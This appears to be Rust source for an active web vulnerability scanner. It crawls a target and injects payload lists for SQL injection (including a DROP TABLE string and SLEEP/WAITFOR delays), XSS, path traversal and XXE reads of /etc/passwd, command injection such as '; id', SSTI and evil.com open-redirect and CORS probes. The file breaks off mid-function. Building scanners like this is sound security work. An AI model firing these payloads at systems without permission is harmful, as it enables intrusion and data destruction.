use crate::proxy::state::{ProxyState, TrafficEntry};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;

#[derive(Clone)]
pub struct ScanLive {
    pub result: Arc<std::sync::Mutex<ScanResult>>,
    pub cancel: Arc<AtomicBool>,
}

fn flush_live(
    live: &ScanLive,
    status: &str,
    progress: f64,
    findings: &[ScanFinding],
    total_requests: u32,
    request_log: &[RequestLog],
    crawled: &[String],
    injections: &[InjectionPoint],
    techs: &[String],
) {
    if let Ok(mut s) = live.result.lock() {
        s.status = status.into();
        s.progress = progress;
        s.findings = findings.to_vec();
        s.total_requests = total_requests;
        s.request_log = request_log.to_vec();
        s.crawled_urls = crawled.to_vec();
        s.injection_points = injections.to_vec();
        s.technologies = techs.to_vec();
    }
}

// Cheap live update for hot loops — only touches the things that change a lot.
fn tick_live(live: &ScanLive, findings: &[ScanFinding], total_requests: u32, request_log: &[RequestLog]) {
    if let Ok(mut s) = live.result.lock() {
        if findings.len() != s.findings.len() {
            s.findings = findings.to_vec();
        }
        s.total_requests = total_requests;
        if request_log.len() != s.request_log.len() {
            s.request_log = request_log.to_vec();
        }
    }
}

// Push the latest scanner request into the shared proxy traffic log so it
// shows up in Sitemap / Dashboard alongside proxy traffic.
pub async fn emit_scanner_traffic(proxy_state: &Option<Arc<ProxyState>>, log: &RequestLog) {
    let Some(ps) = proxy_state else { return };
    let parsed = url::Url::parse(&log.url).ok();
    let host = parsed.as_ref().and_then(|u| u.host_str()).unwrap_or("").to_string();
    let path = parsed.as_ref().map(|u| u.path().to_string()).unwrap_or_else(|| log.url.clone());
    let scheme = parsed.as_ref().map(|u| u.scheme().to_string()).unwrap_or_else(|| "https".into());
    let port = parsed.as_ref().and_then(|u| u.port_or_known_default()).unwrap_or(443);
    let tls = scheme == "https";
    let mime_type = log
        .response_headers
        .iter()
        .find_map(|h| {
            let lower = h.to_ascii_lowercase();
            if lower.starts_with("content-type:") {
                Some(h.splitn(2, ':').nth(1).unwrap_or("").trim().to_string())
            } else {
                None
            }
        })
        .unwrap_or_default();
    let entry = TrafficEntry {
        id: ps.next_id(),
        timestamp: chrono::Utc::now().to_rfc3339(),
        method: log.method.clone(),
        url: log.url.clone(),
        host,
        path,
        port,
        tls,
        status: log.response_status,
        response_length: log.response_size,
        response_time_ms: log.response_time_ms,
        mime_type,
        request_headers: log.request_headers.join("\r\n"),
        request_body: log.request_body.clone().unwrap_or_default(),
        response_headers: log.response_headers.join("\r\n"),
        response_body: log.response_body_preview.clone(),
        source: "scanner".into(),
        notes: String::new(),
        color: String::new(),
    };
    ps.add_traffic(entry).await;
}

macro_rules! check_cancel {
    ($live:expr) => {
        if $live.cancel.load(Ordering::SeqCst) {
            return Ok(());
        }
    };
}

// Bumps the request counter and live-syncs findings + log so the UI sees them appear.
// Also emits the latest request to the proxy traffic log so Sitemap / Dashboard
// see scanner requests live.
macro_rules! bump_req {
    ($live:expr, $total:ident, $findings:expr, $logs:expr, $proxy:expr) => {{
        $total += 1;
        tick_live(&$live, &$findings, $total, &$logs);
        if let Some(log) = $logs.last() {
            emit_scanner_traffic(&$proxy, log).await;
        }
    }};
}

/// WonderSuite Active Scanner Engine v2  — Enterprise-Grade
///
/// Full autonomous vulnerability scanning with:
/// - Auto-crawl to discover all injection points (links, forms, params)
/// - Real payload injection with detailed request/response logging
/// - SQL Injection (error-based, boolean-blind, time-based, UNION-based)
/// - XSS (reflected, DOM, stored canary)
/// - SSRF (internal IP, cloud metadata, DNS rebinding)
/// - SSTI (Jinja2, Twig, Freemarker, ERB, Velocity)
/// - XXE (file read, SSRF via DTD)
/// - Path Traversal / LFI
/// - Command Injection
/// - Open Redirect
/// - CORS misconfiguration
/// - Security header audit
/// - Cookie security audit
/// - Information disclosure (stack traces, debug mode, version leaks)
/// - Technology fingerprinting
/// - Sensitive data exposure (emails, internal IPs, tokens in responses)

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ScanConfig {
    pub max_depth: u32,
    pub max_requests: u32,
    pub follow_redirects: bool,
    pub check_sqli: bool,
    pub check_xss: bool,
    pub check_ssrf: bool,
    pub check_headers: bool,
    pub check_cookies: bool,
    pub check_cors: bool,
    pub check_path_traversal: bool,
    pub check_command_injection: bool,
    pub check_ssti: bool,
    pub check_xxe: bool,
    pub check_open_redirect: bool,
    pub check_info_disclosure: bool,
    pub auto_crawl: bool,
    pub crawl_depth: u32,
    pub timeout_ms: u64,
    pub user_agent: String,
}

impl Default for ScanConfig {
    fn default() -> Self {
        Self {
            max_depth: 3,
            max_requests: 500,
            follow_redirects: true,
            check_sqli: true,
            check_xss: true,
            check_ssrf: true,
            check_headers: true,
            check_cookies: true,
            check_cors: true,
            check_path_traversal: true,
            check_command_injection: true,
            check_ssti: true,
            check_xxe: true,
            check_open_redirect: true,
            check_info_disclosure: true,
            auto_crawl: true,
            crawl_depth: 2,
            timeout_ms: 10000,
            user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36".into(),
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ScanFinding {
    pub id: String,
    pub finding_type: String,
    pub name: String,
    pub severity: String,   // critical, high, medium, low, info
    pub confidence: String, // certain, firm, tentative
    pub url: String,
    pub parameter: Option<String>,
    pub payload: Option<String>,
    pub evidence: Option<String>,
    pub detail: String,
    pub remediation: String,
    pub request_info: Option<RequestLog>,
}

/// Detailed request/response log for each finding
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RequestLog {
    pub method: String,
    pub url: String,
    pub request_headers: Vec<String>,
    pub request_body: Option<String>,
    pub response_status: u16,
    pub response_headers: Vec<String>,
    pub response_body_preview: String,
    pub response_time_ms: u64,
    pub response_size: usize,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ScanResult {
    pub scan_id: String,
    pub target: String,
    pub scan_type: String,
    pub status: String,
    pub progress: f64,
    pub total_requests: u32,
    pub findings: Vec<ScanFinding>,
    pub started_at: String,
    pub completed_at: Option<String>,
    pub duration_ms: u64,
    pub crawled_urls: Vec<String>,
    pub injection_points: Vec<InjectionPoint>,
    pub request_log: Vec<RequestLog>,
    pub technologies: Vec<String>,
}

/// Discovered injection point (param or form input)
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct InjectionPoint {
    pub url: String,
    pub param_name: String,
    pub param_type: String, // query, form, path, header, cookie
    pub original_value: String,
}

const SQLI_ERROR_PAYLOADS: &[&str] = &[
    "'",
    "\"",
    "' OR '1'='1",
    "1' OR '1'='1'--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "'; DROP TABLE test--",
    "1; WAITFOR DELAY '0:0:0'--",
    "' AND 1=CONVERT(int,'a')--",
    "1' AND '1'='1' /*",
    "1 AND 1=1",
    "1 AND 1=2",
    "' OR 1=1#",
    "admin'--",
    "1' ORDER BY 1--",
    "1' ORDER BY 100--",
];

const SQLI_ERROR_SIGNATURES: &[&str] = &[
    "you have an error in your sql syntax",
    "warning: mysql_",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "ora-01756",
    "ora-00933",
    "ora-06512",
    "pg_query",
    "pg_exec",
    "postgresql",
    "microsoft ole db provider",
    "microsoft sql",
    "syntax error",
    "[sqlite_error]",
    "sql syntax",
    "mysql_fetch",
    "mysql_num_rows",
    "odbc sql server driver",
    "sql command not properly ended",
    "invalid column name",
    "column count doesn't match",
    "supplied argument is not a valid mysql",
    "unterminated quoted string",
    "sqlstate",
    "jdbc.sqle",
    "hibernate",
    "javax.persistence",
    "org.hibernate",
    "sql server",
    "sqlite3",
];

const XSS_PAYLOADS: &[(&str, &str)] = &[
    ("<script>alert('WS1')</script>", "WS1"),
    ("\"><img src=x onerror=alert('WS2')>", "WS2"),
    ("'-alert('WS3')-'", "WS3"),
    ("<svg/onload=alert('WS4')>", "WS4"),
    ("javascript:alert('WS5')", "WS5"),
    ("<body onload=alert('WS6')>", "WS6"),
    ("<img src=x onerror=prompt('WS7')>", "WS7"),
    ("'\"--><script>alert('WS8')</script>", "WS8"),
    ("<details open ontoggle=alert('WS9')>", "WS9"),
    ("<marquee onstart=alert('WS10')>", "WS10"),
];

const PATH_TRAVERSAL_PAYLOADS: &[(&str, &str)] = &[
    ("../../../etc/passwd", "root:"),
    ("..\\..\\..\\windows\\win.ini", "[fonts]"),
    ("....//....//....//etc/passwd", "root:"),
    ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "root:"),
    ("..%252f..%252f..%252fetc%252fpasswd", "root:"),
    ("....\\\\....\\\\....\\\\etc\\\\passwd", "root:"),
    ("..%c0%af..%c0%af..%c0%afetc/passwd", "root:"),
];

const CMD_INJECTION_PAYLOADS: &[(&str, &str)] = &[
    ("; id", "uid="),
    ("| id", "uid="),
    ("`id`", "uid="),
    ("$(id)", "uid="),
    ("; whoami", "root"),
    ("| ping -c 1 127.0.0.1", "1 packets transmitted"),
    ("& type C:\\windows\\win.ini", "[fonts]"),
];

const SSTI_PAYLOADS: &[(&str, &str)] = &[
    ("{{7*7}}", "49"),
    ("${7*7}", "49"),
    ("#{7*7}", "49"),
    ("<%= 7*7 %>", "49"),
    ("{{7*'7'}}", "7777777"),
    ("{{config}}", "SECRET_KEY"),
    ("{{self.__class__}}", "__class__"),
    ("{{''.__class__.__mro__}}", "object"),
    ("{{''.join(['a','b'])}}", "ab"),
    ("${T(java.lang.Runtime).getRuntime()}", "java.lang.Runtime"),
];

const XXE_PAYLOADS: &[(&str, &str, &str)] = &[
    ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>", "application/xml", "root:"),
    ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>&xxe;</foo>", "application/xml", "[fonts]"),
    ("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1:80\">]><foo>&xxe;</foo>", "application/xml", "<!DOCTYPE"),
];

const OPEN_REDIRECT_PAYLOADS: &[&str] = &[
    "https://evil.com",
    "//evil.com",
    "https://legitimate.com@evil.com",
    "/\\evil.com",
    "https://evil.com%00.legitimate.com",
    "javascript:alert(1)",
];

const INFO_DISCLOSURE_SIGS: &[(&str, &str, &str)] = &[
    ("stack_trace", "at .+\\(.+:\\d+:\\d+\\)", "JavaScript stack trace exposed"),
    ("php_error", "(?i)(fatal error|warning|notice|parse error).*on line \\d+", "PHP error message exposed"),
    ("java_stack", "at [a-zA-Z]+(\\.[a-zA-Z]+)+\\([A-Za-z]+\\.java:\\d+\\)", "Java stack trace exposed"),
    ("python_tb", "Traceback \\(most recent call last\\)", "Python traceback exposed"),
    ("debug_mode", "(?i)(debug[_\\s]?mode|debug[_\\s]?=\\s*true|debug[_\\s]?enabled)", "Debug mode enabled"),
    (
        "internal_path",
        "(?i)(/home/[a-z]+/|/var/www/|/opt/|C:\\\\Users\\\\|C:\\\\inetpub)",
        "Internal file path exposed",
    ),
    (
        "sql_query",
        "(?i)(SELECT .+ FROM|INSERT INTO|UPDATE .+ SET|DELETE FROM)",
        "SQL query exposed in response",
    ),
    (
        "env_var",
        "(?i)(DATABASE_URL|SECRET_KEY|API_KEY|AWS_ACCESS|PRIVATE_KEY)\\s*[:=]",
        "Environment variable leak",
    ),
    (
        "version_header",
        "(?i)(PHP/|ASP\\.NET|Express/|Django/|Rails/|Flask/|Spring/)",
        "Framework version disclosed",
    ),
];

const TECH_PATTERNS: &[(&str, &str)] = &[
    ("React", "react"),
    ("Vue.js", "__vue__|vue\\.js|v-bind|v-model"),
    ("Angular", "ng-app|angular\\.js|ng-model|ng-controller"),
    ("jQuery", "jquery"),
    ("Bootstrap", "bootstrap"),
    ("WordPress", "wp-content|wp-includes|wp-json|wordpress"),
    ("Drupal", "Drupal|drupal\\.js|drupal-"),
    ("Laravel", "laravel_session|laravel"),
    ("Django", "csrfmiddlewaretoken|django"),
    ("Express", "X-Powered-By.*Express"),
    ("Next.js", "_next/|__NEXT_DATA__"),
    ("Nginx", "nginx"),
    ("Apache", "Apache"),
    ("Cloudflare", "cloudflare|cf-ray"),
    ("PHP", "PHPSESSID|php"),
    ("ASP.NET", "ASP\\.NET|aspnet|__VIEWSTATE"),
    ("Ruby on Rails", "_rails|action_dispatch|rails"),
    ("Spring", "JSESSIONID|spring"),
];

/// Run a full active scan against a target URL.
pub async fn run_active_scan(
    target: &str,
    config: &ScanConfig,
    live: ScanLive,
    proxy_state: Option<Arc<ProxyState>>,
) -> Result<(), String> {
    let mut findings: Vec<ScanFinding> = Vec::new();
    let mut total_requests: u32 = 0;
    let mut all_request_logs: Vec<RequestLog> = Vec::new();
    let mut crawled_urls: Vec<String> = vec![target.to_string()];
    let mut injection_points: Vec<InjectionPoint> = Vec::new();
    let mut detected_techs: Vec<String> = Vec::new();

    flush_live(
        &live,
        "baseline",
        2.0,
        &findings,
        total_requests,
        &all_request_logs,
        &crawled_urls,
        &injection_points,
        &detected_techs,
    );
    check_cancel!(live);

    let client = reqwest::Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(std::time::Duration::from_millis(config.timeout_ms))
        .redirect(if config.follow_redirects {
            reqwest::redirect::Policy::limited(5)
        } else {
            reqwest::redirect::Policy::none()
        })
        .user_agent(&config.user_agent)
        .build()
        .map_err(|e| e.to_string())?;

    let req_start = std::time::Instant::now();
    let baseline = client.get(target).send().await.map_err(|e| e.to_string())?;
    bump_req!(live, total_requests, findings, all_request_logs, proxy_state);
    let baseline_status = baseline.status().as_u16();
    let baseline_headers: HashMap<String, String> = baseline
        .headers()
        .iter()
        .map(|(k, v)| (k.to_string().to_lowercase(), v.to_str().unwrap_or("").to_string()))
        .collect();
    let resp_headers_log: Vec<String> =
        baseline.headers().iter().map(|(k, v)| format!("{}: {}", k, v.to_str().unwrap_or(""))).collect();
    let baseline_body = baseline.text().await.map_err(|e| e.to_string())?;
    let baseline_len = baseline_body.len();

    all_request_logs.push(RequestLog {
        method: "GET".into(),
        url: target.into(),
        request_headers: vec!["User-Agent: WonderSuite Scanner".into()],
        request_body: None,
        response_status: baseline_status,
        response_headers: resp_headers_log.clone(),
        response_body_preview: baseline_body.chars().take(500).collect(),
        response_time_ms: req_start.elapsed().as_millis() as u64,
        response_size: baseline_len,
    });

    for (tech, pattern) in TECH_PATTERNS {
        if let Ok(re) = regex::Regex::new(&format!("(?i){}", pattern)) {
            if re.is_match(&baseline_body) || baseline_headers.values().any(|v| re.is_match(v)) {
                if !detected_techs.contains(&tech.to_string()) {
                    detected_techs.push(tech.to_string());
                }
            }
        }
    }

    flush_live(
        &live,
        "crawling",
        8.0,
        &findings,
        total_requests,
        &all_request_logs,
        &crawled_urls,
        &injection_points,
        &detected_techs,
    );
    check_cancel!(live);

    if config.auto_crawl {
        let base_url = url::Url::parse(target).ok();
        let base_host = base_url.as_ref().and_then(|u| u.host_str()).unwrap_or("").to_string();

        let link_re = regex::Regex::new(r#"(?:href|src|action)\s*=\s*["']([^"'#]+)["']"#).unwrap();
        let mut link_queue: Vec<String> = Vec::new();
        for cap in link_re.captures_iter(&baseline_body) {
            if let Some(m) = cap.get(1) {
                let link = m.as_str();
                if link.starts_with("javascript:") || link.starts_with("mailto:") || link.starts_with("#") {
                    continue;
                }
                let resolved = if let Ok(u) = url::Url::parse(link) {
                    u.to_string()
                } else if let Some(ref base) = base_url {
                    base.join(link).map(|u| u.to_string()).unwrap_or_default()
                } else {
                    continue;
                };
                if let Ok(u) = url::Url::parse(&resolved) {
                    if u.host_str().unwrap_or("") == base_host && !crawled_urls.contains(&resolved) {
                        link_queue.push(resolved);
                    }
                }
            }
        }

        for url in link_queue.into_iter().take(100) {
            if total_requests >= config.max_requests / 2 {
                break;
            }
            let req_start = std::time::Instant::now();
            if let Ok(resp) = client.get(&url).send().await {
                bump_req!(live, total_requests, findings, all_request_logs, proxy_state);
                let status = resp.status().as_u16();
                let ct = resp
                    .headers()
                    .get("content-type")
                    .and_then(|v| v.to_str().ok())
                    .unwrap_or("")
                    .to_string();
                let hdrs: Vec<String> = resp
                    .headers()
                    .iter()
                    .map(|(k, v)| format!("{}: {}", k, v.to_str().unwrap_or("")))
                    .collect();
                let body = resp.text().await.unwrap_or_default();

                all_request_logs.push(RequestLog {
                    method: "GET".into(),
                    url: url.clone(),
                    request_headers: vec![],
                    request_body: None,
                    response_status: status,
                    response_headers: hdrs,
                    response_body_preview: body.chars().take(300).collect(),
                    response_time_ms: req_start.elapsed().as_millis() as u64,
                    response_size: body.len(),
                });

                crawled_urls.push(url.clone());

                if ct.contains("html") {
                    for cap in link_re.captures_iter(&body) {
                        if let Some(m) = cap.get(1) {
                            let link = m.as_str();
                            if link.starts_with("javascript:") || link.starts_with("mailto:") {
                                continue;
                            }
                            if let Some(ref base) = base_url {
                                if let Ok(resolved) = base.join(link) {
                                    let resolved = resolved.to_string();
                                    if !crawled_urls.contains(&resolved) {
                                        crawled_urls.push(resolved);
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    flush_live(
        &live,
        "enumerating",
        18.0,
        &findings,
        total_requests,
        &all_request_logs,
        &crawled_urls,
        &injection_points,
        &detected_techs,
    );
    check_cancel!(live);

    let mut all_params: Vec<(String, String, String)> = Vec::new(); // (url, param_name, param_value)

    for url in &crawled_urls {
        if let Ok(parsed) = url::Url::parse(url) {
            for (k, v) in parsed.query_pairs() {
                let point = InjectionPoint {
                    url: url.clone(),
                    param_name: k.to_string(),
                    param_type: "query".into(),
                    original_value: v.to_string(),
                };
                if !injection_points.iter().any(|p| p.url == point.url && p.param_name == point.param_name) {
                    injection_points.push(point);
                    all_params.push((url.clone(), k.to_string(), v.to_string()));
                }
            }
        }
    }

    let form_re =
        regex::Regex::new(r#"<form[^>]*action\s*=\s*["']([^"']*)["'][^>]*>([\s\S]*?)</form>"#).unwrap();
    let input_re = regex::Regex::new(r#"<input[^>]*name\s*=\s*["']([^"']+)["'][^>]*>"#).unwrap();
    let method_re = regex::Regex::new(r#"method\s*=\s*["'](\w+)["']"#).unwrap();

    for form_cap in form_re.captures_iter(&baseline_body) {
        let action = form_cap.get(1).map(|m| m.as_str()).unwrap_or("");
        let form_inner = form_cap.get(2).map(|m| m.as_str()).unwrap_or("");
        let form_url = if action.is_empty() || action == "#" {
            target.to_string()
        } else if let Some(ref base) = url::Url::parse(target).ok() {
            base.join(action).map(|u| u.to_string()).unwrap_or_else(|_| target.to_string())
        } else {
            target.to_string()
        };

        for input_cap in input_re.captures_iter(form_inner) {
            if let Some(name) = input_cap.get(1) {
                let point = InjectionPoint {
                    url: form_url.clone(),
                    param_name: name.as_str().to_string(),
                    param_type: "form".into(),
                    original_value: "".into(),
                };
                if !injection_points.iter().any(|p| p.param_name == point.param_name && p.url == point.url) {
                    injection_points.push(point);
                    all_params.push((form_url.clone(), name.as_str().to_string(), "test".to_string()));
                }
            }
        }
    }

    if all_params.is_empty() {
        let common_params = [
            "id", "page", "q", "search", "query", "name", "user", "username", "email", "file", "filename",
            "url", "redirect", "return", "next", "callback", "path", "dir", "folder", "action", "type",
            "cat", "category", "item", "view", "lang", "locale", "ref", "token", "key", "code", "hash",
            "session", "uid", "pid", "order_id", "product", "include", "template", "page_id", "load", "show",
            "filter", "sort", "order",
        ];
        for param in &common_params {
            let test_url = if target.contains('?') {
                format!("{}&{}=test", target, param)
            } else {
                format!("{}?{}=test", target, param)
            };
            all_params.push((test_url, param.to_string(), "test".to_string()));
            injection_points.push(InjectionPoint {
                url: target.to_string(),
                param_name: param.to_string(),
                param_type: "discovered".into(),
                original_value: "".into(),
            });
        }
    }

    flush_live(
        &live,
        "passive checks",
        25.0,
        &findings,
        total_requests,
        &all_request_logs,
        &crawled_urls,
        &injection_points,
        &detected_techs,
    );
    check_cancel!(live);

    if config.check_headers {
        passive_header_scan(target, &baseline_headers, &baseline_body, &mut findings);
    }
    if config.check_cookies {
        passive_cookie_scan(target, &baseline_headers, &mut findings);
    }
    if config.check_cors {
        let req_start = std::time::Instant::now();
        if let Ok(cors_resp) = client.get(target).header("Origin", "https://evil.com").send().await {
            bump_req!(live, total_requests, findings, all_request_logs, proxy_state);
            let status = cors_resp.status().as_u16();
            let cors_headers: HashMap<String, String> = cors_resp
                .headers()
                .iter()
                .map(|(k, v)| (k.to_string().to_lowercase(), v.to_str().unwrap_or("").to_string()))
                .collect();
            let hdrs: Vec<String> = cors_resp
                .headers()
                .iter()
                .map(|(k, v)| format!("{}: {}", k, v.to_str().unwrap_or("")))
                .collect();
            let body = cors_resp.text().await.unwrap_or_default();

            all_request_logs.push(RequestLog {
                method: "GET".into(),
                url: target.into(),
                request_headers: vec!["Origin: https://evil.com".into()],
                request_body: None,
                response_status: status,
                response_headers: hdrs,
                response_body_preview: body.chars().take(200).collect(),
                response_time_ms: req_start.elapsed().as_millis() as u64,
                response_size: body.len(),
            });

            if let Some(acao) = cors_headers.get("access-control-allow-origin") {
                if acao == "*" || acao.contains("evil.com") {
                    let acac = cors_headers
                        .get("access-control-allow-credentials")
                        .map(|v| v.as_str())
                        .unwrap_or("false");
                    findings.push(ScanFinding {
                        id: uuid::Uuid::new_v4().to_string(),
                        finding_type: "cors".into(),
                        name: "CORS Misconfiguration".into(),
                        severity: if acac == "true" { "high" } else { "medium" }.into(),
                        confidence: "certain".into(),
                        url: target.into(), parameter: None,
                        payload: Some("Origin: https://evil.com".into()),
                        evidence: Some(format!("Access-Control-Allow-Origin: {} | Allow-Credentials: {}", acao, acac)),
                        detail: format!("The server reflects arbitrary origins. ACAO: '{}', Credentials: {}. {} read cross-origin data.", acao, acac,
                            if acac == "true" { "An attacker CAN" } else { "An attacker may" }),
                        remediation: "Restrict CORS to specific trusted domains. Never use '*' with credentials.".into(),
                        request_info: None,
                    });
                }
            }
        }
    }

    if config.check_info_disclosure {
        info_disclosure_scan(target, &baseline_body, &baseline_headers, &mut findings);
    }

    flush_live(
        &live,
        "scanning sqli",
        32.0,
        &findings,
        total_requests,
        &all_request_logs,
        &crawled_urls,
        &injection_points,
        &detected_techs,
    );
    check_cancel!(live);

    if config.check_sqli {
        for (param_url, param_name, param_value) in &all_params {
            if total_requests >= config.max_requests {
                break;
            }

            for payload in SQLI_ERROR_PAYLOADS {
                if total_requests >= config.max_requests {
                    break;
                }
                let test_url = inject_param(param_url, param_name, payload);
                let req_start = std::time::Instant::now();
                if let Ok(resp) = client.get(&test_url).send().await {
                    bump_req!(live, total_requests, findings, all_request_logs, proxy_state);
                    let status = resp.status().as_u16();
                    let hdrs: Vec<String> = resp
                        .headers()
                        .iter()
                        .map(|(k, v)| format!("{}: {}", k, v.to_str().unwrap_or("")))
                        .collect();
                    let body = resp.text().await.unwrap_or_default();
                    let body_lower = body.to_lowercase();
                    let elapsed = req_start.elapsed().as_millis() as u64;

                    let req_log = RequestLog {
                        method: "GET".into(),
                        url: test_url.clone(),
                        request_headers: vec![format!("Payload: {}", payload)],
                        request_body: None,
                        response_status: status,
                        response_headers: hdrs,
                        response_body_preview: body.chars().take(500).collect(),
                        response_time_ms: elapsed,
                        response_size: body.len(),
                    };

                    for sig in SQLI_ERROR_SIGNATURES {
                        if body_lower.contains(sig) {
                            findings.push(ScanFinding {
                                id: uuid::Uuid::new_v4().to_string(),
                                finding_type: "sqli".into(),
                                name: "SQL Injection (Error-Based)".into(),
                                severity: "high".into(), confidence: "firm".into(),
                                url: test_url.clone(),
                                parameter: Some(param_name.clone()),
                                payload: Some(payload.to_string()),
                                evidence: Some(format!("DB error signature found: '{}' | Status: {} | Response size: {} bytes | Time: {}ms", sig, status, body.len(), elapsed)),
                                detail: format!("Parameter '{}' on {} is vulnerable to error-based SQL injection.\n\nInjecting payload: {}\nTriggered database error containing: '{}'\n\nThis means user input is being concatenated directly into SQL queries.", param_name, param_url, payload, sig),
                                remediation: "1. Use parameterized queries (prepared statements)\n2. Use ORM frameworks\n3. Apply input validation\n4. Use WAF rules for SQL injection".into(),
                                request_info: Some(req_log.clone()),
                            });
                            all_request_logs.push(req_log);
                            break;
                        }
                    }
                }
            }

            if total_requests + 2 < config.max_requests {
                let true_url = inject_param(param_url, param_name, &format!("{}' AND '1'='1", param_value));
                let false_url = inject_param(param_url, param_name, &format!("{}' AND '1'='2", param_value));
                let req_start = std::time::Instant::now();
                if let (Ok(true_resp), Ok(false_resp)) =
                    (client.get(&true_url).send().await, client.get(&false_url).send().await)
                {
                    bump_req!(live, total_requests, findings, all_request_logs, proxy_state);
                    bump_req!(live, total_requests, findings, all_request_logs, proxy_state);
                    let true_status = true_resp.status().as_u16();
                    let false_status = false_resp.status().as_u16();
                    let true_body = true_resp.text().await.unwrap_or_default();
                    let false_body = false_resp.text().await.unwrap_or_default();

                    let baseline_diff = (true_body.len() as i64 - baseline_len as i64).unsigned_abs();
                    let false_diff = (false_body.len() as i64 - baseline_len as i64).unsigned_abs();
                    let tf_diff = (true_body.len() as i64 - false_body.len() as i64).unsigned_abs();

                    if (baseline_diff < 50 && false_diff > 200)
                        || (tf_diff > 200 && true_status != false_status)
                    {
                        findings.push(ScanFinding {
                            id: uuid::Uuid::new_v4().to_string(),
                            finding_type: "sqli".into(),
                            name: "SQL Injection (Boolean-Based Blind)".into(),
                            severity: "high".into(), confidence: "tentative".into(),
                            url: param_url.clone(),
                            parameter: Some(param_name.clone()),
                            payload: Some("' AND '1'='1 vs ' AND '1'='2".into()),
                            evidence: Some(format!(
                                "TRUE condition: {} bytes (status {}) | FALSE condition: {} bytes (status {}) | Baseline: {} bytes\nDifference: {} bytes between true/false",
                                true_body.len(), true_status, false_body.len(), false_status, baseline_len, tf_diff)),
                            detail: format!("Parameter '{}' shows different behavior with boolean SQL conditions:\n• TRUE ('1'='1'): {} bytes, status {}\n• FALSE ('1'='2'): {} bytes, status {}\n• Baseline: {} bytes\n\nThis differential response suggests the parameter is used in a SQL WHERE clause.",
                                param_name, true_body.len(), true_status, false_body.len(), false_status, baseline_len),
                            remediation: "Use parameterized queries. Never concatenate user input into SQL.".into(),
                            request_info: None,
                        });
                    }
                }
            }

            if total_requests + 1 < config.max_requests {
                let time_payloads = [
                    format!("{}' AND SLEEP(3)--", param_value),
                    format!("{}'; WAITFOR DELAY '0:0:3'--", param_value),
                    format!("{} AND pg_sleep(3)--", param_value),
                ];
                for tp in &time_payloads {
                    if total_requests >= config.max_requests {
                        break;
                    }
                    let time_url = inject_param(param_url, param_name, tp);
                    let req_start = std::time::Instant::now();
                    if let Ok(resp) = client.get(&time_url).send().await {
                        bump_req!(live, total_requests, findings, all_request_logs, proxy_state);
                        let elapsed = req_start.elapsed().as_millis();
                        let status = resp.status().as_u16();
                        if elapsed > 2800 {
                            findings.push(ScanFinding {
                                id: uuid::Uuid::new_v4().to_string(),
                                finding_type: "sqli".into(),
                                name: "SQL Injection (Time-Based Blind)".into(),
                                severity: "high".into(), confidence: "firm".into(),
                                url: param_url.clone(),
                                parameter: Some(param_name.clone()),
                                payload: Some(tp.clone()),
                                evidence: Some(format!("Response delayed by {}ms (injected 3s delay) | Status: {}", elapsed, status)),
                                detail: format!("Parameter '{}' is vulnerable to time-based blind SQL injection.\n\nPayload: {}\nExpected delay: 3000ms\nActual delay: {}ms\n\nThe database executed the SLEEP/WAITFOR command, confirming injection.", param_name, tp, elapsed),
                                remediation: "Use parameterized queries.".into(),
                                request_info: None,
                            });
                            break;
                        }
                    }
                }
            }
        }
    }

    flush_live(
        &live,
        "scanning xss",
        48.0,
        &findings,
        total_requests,
        &all_request_logs,
        &crawled_urls,
        &injection_points,
        &detected_techs,
    );
    check_cancel!(live);

    if config.check_xss {
        for (param_url, param_name, _) in &all_params {
            if total_requests >= config.max_requests {
                break;
            }

            let canary = format!("ws{}", rand_id(8));
            let canary_url = inject_param(param_url, param_name, &canary);
            if let Ok(resp) = client.get(&canary_url).send().await {
                bump_req!(live, total_requests, findings, all_request_logs, proxy_state);
                let body = resp.text().await.unwrap_or_default();

                if body.contains(&canary) {
                    let in_tag =
                        body.contains(&format!("<{}", canary)) || body.contains(&format!("\"{}\"", canary));
                    let in_attr = body.contains(&format!("=\"{}\"", canary))
                        || body.contains(&format!("='{}'", canary));
                    let in_script =
                        body.contains(&format!("var {}=", canary)) || body.contains(&format!("'{}'", canary));

                    for (payload, marker) in XSS_PAYLOADS {
                        if total_requests >= config.max_requests {
                            break;
                        }
                        let xss_url = inject_param(param_url, param_name, payload);
                        let req_start = std::time::Instant::now();
                        if let Ok(xss_resp) = client.get(&xss_url).send().await {
                            bump_req!(live, total_requests, findings, all_request_logs, proxy_state);
                            let status = xss_resp.status().as_u16();
                            let ct = xss_resp
                                .headers()
                                .get("content-type")
                                .and_then(|v| v.to_str().ok())
                                .unwrap_or("")
                                .to_string();
                            let hdrs: Vec<String> = xss_resp
                                .headers()
                                .iter()
                                .map(|(k, v)| format!("{}: {}", k, v.to_str().unwrap_or("")))
                                .collect();
                            let xss_body = xss_resp.text().await.unwrap_or_default();
                            let elapsed = req_start.elapsed().as_millis() as u64;

                            if xss_body.contains(payload) || xss_body.contains(marker) {
                                let context = if in_script {
                                    "JavaScript"
                                } else if in_attr {
                                    "HTML attribute"
                                } else if in_tag {
                                    "HTML tag"
                                } else {
                                    "HTML body"
                                };
                                findings.push(ScanFinding {
                                    id: uuid::Uuid::new_v4().to_string(),
                                    finding_type: "xss".into(),
                                    name: "Cross-Site Scripting (Reflected XSS)".into(),
                                    severity: "high".into(), confidence: "firm".into(),
                                    url: xss_url.clone(),
                                    parameter: Some(param_name.clone()),
                                    payload: Some(payload.to_string()),
